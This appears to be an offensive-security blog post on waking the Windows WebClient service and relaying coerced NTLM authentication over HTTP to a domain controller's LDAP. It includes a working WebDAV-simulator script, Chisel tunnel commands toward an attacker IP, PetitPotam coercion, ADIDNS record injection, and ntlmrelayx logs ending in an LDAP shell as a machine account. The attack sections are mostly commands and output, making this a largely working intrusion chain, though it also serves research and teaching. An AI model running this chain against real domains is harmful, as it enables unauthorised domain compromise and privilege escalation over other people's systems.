---
title: "What DAV fuck?"
date: 2026-11-20 00:00:00 +0000
categories: [Active Directory, Research]
tags: [active-directory, webdav, webclient, ntlm-relay, coercion, petitpotam, adidns, shadow-credentials, ldap, mrxdav]
description: "How the dormant WebClient service can be woken on demand, coerced over HTTP, and relayed to LDAP, with and without ADIDNS."
---

## What is WebDAV?

WebDAV (Web Distributed Authoring and Versioning) is an extension of HTTP that lets users and applications manage files on a remote server. It allows you to browse remote folders, upload and download files, and create, rename, move, delete, or edit files directly on the server.

On Windows, this functionality is provided by the **WebClient** service, which enables applications and File Explorer to access files on web servers over WebDAV (HTTP/HTTPS) as if they were ordinary network shares. Checking whether it is available is straightforward:

```console
PS C:\> cmd /c sc query WebClient

SERVICE_NAME: WebClient
    TYPE               : 20  WIN32_SHARE_PROCESS
    STATE              : 1  STOPPED
    WIN32_EXIT_CODE    : 0  (0x0)
    SERVICE_EXIT_CODE  : 0  (0x0)
    CHECKPOINT         : 0x0
    WAIT_HINT          : 0x0

PS C:\> cmd /c sc qc WebClient

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: WebClient
    TYPE               : 20  WIN32_SHARE_PROCESS
    START_TYPE         : 3   DEMAND_START
    ERROR_CONTROL      : 1   NORMAL
    BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k WebClientGroup
    LOAD_ORDER_GROUP   : NetworkProvider
    TAG                : 0
    DISPLAY_NAME       : WebClient
    DEPENDENCIES       : MRxDAV
SERVICE_START_NAME : NT AUTHORITY\LocalService
```

The interesting detail here is `START_TYPE`, set to `DEMAND_START`. In Windows, `START_TYPE 3` means **Manual (on-demand start)**, the service does not start at boot. It starts only when requested by a user, an application, another service, the Service Control Manager (SCM), or a system trigger event.

This matters a lot, because it means that even when the service is installed but inactive, **it can be woken on demand**. Keep this in mind, we will come back to it on the offensive side.

![WebDAV coercion](https://i.postimg.cc/HW7wZdpv/image.webp){: width="700" .shadow }

---

## Triggering the service

There are several ways to trigger the WebClient service. A few simple ones:

```console
net use \\localhost@80\x
net use \\127.0.0.1@80\x
net use \\NETBIOS@80\x
```

And just like that, the service flips to `Running`:

```console
PS C:\> Get-Service WebClient

Status   Name               DisplayName
------   ----               -----------
Running  WebClient          WebClient
```

Notice the UNC path contains `@80`. When **MUP** (the Multiple UNC Provider) sees this syntax, it routes the request to the WebDAV redirector instead of SMB, for example.

### Watching it from the server side

To understand the behaviour, let's stand up a plain HTTP listener and watch what the client sends. First, a basic Python server:

```console
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Then, from Windows, we try to mount a WebDAV share:

```console
PS C:\> net use \\10.10.17.22@80\x
System error 53 has occurred.

The network path was not found.
```

We get `The network path was not found`, and on the server we can see the probe arrive:

```console
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.231.20 - - [20/Nov/2026 05:23:33] code 501, message Unsupported method ('OPTIONS')
10.129.231.20 - - [20/Nov/2026 05:23:33] "OPTIONS / HTTP/1.1" 501 -
```

But the WebClient service was **not** triggered, it is still stopped:

```console
PS C:\> Get-Service WebClient

Status   Name               DisplayName
------   ----               -----------
Stopped  WebClient          WebClient
```

This happens because our rogue listener cannot actually behave like a WebDAV server. When the client's first request (an `OPTIONS`) is met with a bare `501 Unsupported method`, Windows concludes the endpoint isn't WebDAV and tears everything down instead of keeping the service alive.

---

## Simulating a real WebDAV server

To make the client commit, we need to answer like a genuine WebDAV server. Here is a small Python 3 script that does exactly that:

```python
#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

HOST = '0.0.0.0'
PORT = 80

DAV_HEADERS = [
    ('Allow', 'OPTIONS,GET,HEAD,POST,DELETE,TRACE,PROPFIND,PROPPATCH,COPY,MOVE,LOCK,UNLOCK'),
    ('Public', 'OPTIONS,GET,HEAD,POST,PROPFIND,PROPPATCH,LOCK,UNLOCK'),
    ('DAV', '1,2,3'),
    ('MS-Author-Via', 'DAV'),
]


def is_dav(ua):
    ua = ua.lower()
    return 'webdav' in ua or 'miniredir' in ua or 'davclnt' in ua


class DAV(BaseHTTPRequestHandler):
    protocol_version = 'HTTP/1.1'

    def version_string(self):
        return 'Microsoft-IIS/10.0'

    def handle_one_request(self):
        try:
            super().handle_one_request()
        except (ConnectionResetError, BrokenPipeError):
            self.close_connection = True

    def emit(self, code, reason, headers, body=b'', note=''):
        ua = self.headers.get('User-Agent') or '-'
        tag = 'WebDAV' if is_dav(ua) else 'other'
        print('[>] %-15s %-9s %-24s [%s] %s' % (self.client_address[0], self.command, self.path, tag, ua))
        print('[<] %d %s%s' % (code, reason, ('  ' + note) if note else ''))
        self.send_response(code, reason)
        for k, v in headers:
            self.send_header(k, v)
        self.end_headers()
        if body:
            self.wfile.write(body)

    def respond(self):
        cl = int(self.headers.get('Content-Length') or 0)
        if cl:
            self.rfile.read(cl)

        if self.command == 'PROPFIND':
            body = (b'<?xml version="1.0" encoding="utf-8"?>'
                    b'<D:multistatus xmlns:D="DAV:"><D:response>'
                    b'<D:href>' + self.path.encode() + b'</D:href>'
                    b'<D:propstat><D:prop>'
                    b'<D:resourcetype><D:collection/></D:resourcetype>'
                    b'<D:getcontentlength>0</D:getcontentlength>'
                    b'</D:prop><D:status>HTTP/1.1 200 OK</D:status>'
                    b'</D:propstat></D:response></D:multistatus>')
            headers = DAV_HEADERS + [
                ('Content-Type', 'text/xml; charset="utf-8"'),
                ('Content-Length', str(len(body))),
            ]
            self.emit(207, 'Multi-Status', headers, body)
        else:
            headers = DAV_HEADERS + [('Content-Length', '0')]
            self.emit(200, 'OK', headers, note='(DAV: 1,2,3 / MS-Author-Via: DAV)')

    do_OPTIONS = respond
    do_PROPFIND = respond
    do_PROPPATCH = respond
    do_GET = respond
    do_HEAD = respond
    do_POST = respond
    do_LOCK = respond
    do_UNLOCK = respond

    def log_message(self, fmt, *args):
        return


if __name__ == '__main__':
    print('[*] WebDAV simulation on %s:%d' % (HOST, PORT))
    srv = ThreadingHTTPServer((HOST, PORT), DAV)
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print('\n[*] stopped')
        srv.shutdown()
```

With the simulator running, we trigger the mount again:

```console
PS C:\> net use \\10.10.17.22@80\x
The command completed successfully.
```

And this time the service starts:

```console
PS C:\> Get-Service WebClient

Status   Name               DisplayName
------   ----               -----------
Running  WebClient          WebClient
```

So what changed?

The Windows mini-redirector doesn't trust a server just because it replied. It decides whether an endpoint is *really* WebDAV by inspecting the **`OPTIONS` response**, and it looks for one specific fingerprint, the `DAV` and `MS-Author-Via: DAV` headers. Our plain Python server never sent them (it just returned a `501`), so the redirector wrote the host off as "not WebDAV" and tore the connection down. The simulator sends them, the redirector is convinced, and the WebClient service brings to life.

---

## The offensive side

**WebDAV NTLM Relay** is a technique in Windows / Active Directory environments that abuses the WebClient service to force NTLM authentication over **HTTP instead of SMB**.

This protocol switch is critical because NTLM authentication over HTTP does not carry signing flags (`NTLM Negotiate Sign`) by default. That lets an attacker sidestep SMB Signing protections and relay the authentication to high-value targets such as **LDAP** or **ADCS** (Active Directory Certificate Services).

There are several ways to achieve this. In this post we will look at two, the first **without** adding a custom DNS zone in ADIDNS, and the second **with** one.

---

## ADIDNS-less approach

We start by triggering the WebClient service and verifying it is up:

```console
PS C:\> net use \\localhost@80\x
System error 53 has occurred.

The network path was not found.

PS C:\> get-service webclient

Status   Name               DisplayName
------   ----               -----------
Running  WebClient          webclient
```

Now let's assume our target is vulnerable to **PetitPotam** as a coercion mechanism. To pull this off, we first need a listener on the target, one that encapsulates all traffic arriving on a local port and forwards it back to our own server.

For simplicity, we use **Chisel**. The client on the target listens on `127.0.0.1:10000` and forwards everything to our attacker box on port `80`:

```console
PS C:\> .\chisel.exe client 10.10.17.22:8000 127.0.0.1:10000:127.0.0.1:80
2026/11/20 05:22:48 client: Connecting to ws://10.10.17.22:8000
2026/11/20 05:22:48 client: tun: proxy#127.0.0.1:10000=>80: Listening
2026/11/20 05:22:49 client: Connected (Latency 46.8776ms)
```

> **Why the loopback hop?** By coercing it to authenticate to *its own* `127.0.0.1:10000` and tunnelling that out through the Chisel channel it opened to us, we smuggle the authentication back to our relay.
{: .prompt-info }

Next, we start `ntlmrelayx`:

```console
proxychains -q ntlmrelayx.py -t ldap://192.168.100.100 -i
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Protocol Client WINRMS loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Setting up MSSQL Server on port 1433
[*] Setting up RDP Server on port 3389
[*] Multirelay disabled

[*] Servers started, waiting for connections
```

In our setup, `.100` is the domain controller, and we will relay the NetNTLMv2 challenge to its LDAP service.

Now we coerce the target to authenticate to the local listener:

```console
proxychains -q python3 PetitPotam.py -u xqn -p xqn -d contoso.local 'localhost@10000/x' 192.168.100.101

Trying pipe lsarpc
[-] Connecting to ncacn_np:192.168.100.101[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

The chain lands:

```console
proxychains -q ntlmrelayx.py -t ldap://192.168.100.100 -i
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Protocol Client WINRMS loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Setting up MSSQL Server on port 1433
[*] Setting up RDP Server on port 3389
[*] Multirelay disabled

[*] Servers started, waiting for connections
[*] (HTTP): Client requested path: /x/pipe/srvsvc
[*] (HTTP): Client requested path: /x/pipe/srvsvc
[*] (HTTP): Connection from 127.0.0.1 controlled, attacking target ldap://192.168.100.100
[*] (HTTP): Client requested path: /x/pipe/srvsvc
[*] (HTTP): Authenticating connection from CONTOSO/MS01$@127.0.0.1 against ldap://192.168.100.100 SUCCEED [1]
[*] ldap://CONTOSO/MS01$@192.168.100.100 [1] -> Started interactive Ldap shell via TCP on 127.0.0.1:11000 as CONTOSO/MS01$
[*] (HTTP): Client requested path: /x/pipe/srvsvc
[*] (HTTP): Client requested path: /x/pipe/srvsvc
[*] All targets processed!
[*] (HTTP): Connection from 127.0.0.1 controlled, but there are no more targets left!
```

The machine account `CONTOSO\MS01$` is now authenticated against the DC's LDAP. From here we can get creative and obtain SYSTEM on the server in several ways, for example by configuring **RBCD** (Resource-Based Constrained Delegation) or by using the **Shadow Credentials** technique to recover the machine account hash for later use.

---

## ADIDNS approach

By default, Domain Users are allowed to add new records in **ADIDNS** to support dynamic DNS updates. Instead of relying on a loopback tunnel, we can simply register a DNS record that points a name of our choosing straight at our IP.

```console
proxychains -q python3 dnstool.py -u 'contoso\xqn' \
-p xqn \
192.168.100.100 -a add --tcp \
-r '0xqn.contoso.local' -d 10.10.17.22

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

With `0xqn.contoso.local` now resolving to our attacker box, we coerce the target toward that name:

```console
proxychains -q python3 PetitPotam.py -u xqn -p xqn -d contoso.local '0xqn@80/x' 192.168.100.101

Trying pipe lsarpc
[-] Connecting to ncacn_np:192.168.100.101[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

And we reach the same result:

```console
proxychains -q ntlmrelayx.py -t ldap://192.168.100.100 -i
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Protocol Client WINRMS loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Setting up MSSQL Server on port 1433
[*] Setting up RDP Server on port 3389
[*] Multirelay disabled

[*] Servers started, waiting for connections
[*] (HTTP): Client requested path: /x/pipe/srvsvc
[*] (HTTP): Client requested path: /x/pipe/srvsvc
[*] (HTTP): Connection from 10.129.231.20 controlled, attacking target ldap://192.168.100.100
[*] (HTTP): Client requested path: /x/pipe/srvsvc
[*] (HTTP): Authenticating connection from CONTOSO/MS01$@10.129.231.20 against ldap://192.168.100.100 SUCCEED [1]
[*] ldap://CONTOSO/MS01$@192.168.100.100 [1] -> Started interactive Ldap shell via TCP on 127.0.0.1:11000 as CONTOSO/MS01$
[*] (HTTP): Client requested path: /x/pipe/srvsvc
[*] (HTTP): Client requested path: /x/pipe/srvsvc
[*] All targets processed!
[*] (HTTP): Connection from 10.129.231.20 controlled, but there are no more targets left!
```

---

## Wrapping up

Two routes, one outcome, the dormant WebClient service, once woken, turns a coercion primitive into an **HTTP** authentication we can relay past SMB Signing and straight into LDAP as a machine account.

- **ADIDNS-less:** bounce the auth off the target's own loopback and tunnel it. Great when you can't (or don't want to) touch DNS.
- **ADIDNS:** plant a record that resolves to you and let the target come to you directly. Cleaner, and possible because Domain Users can register records by default.
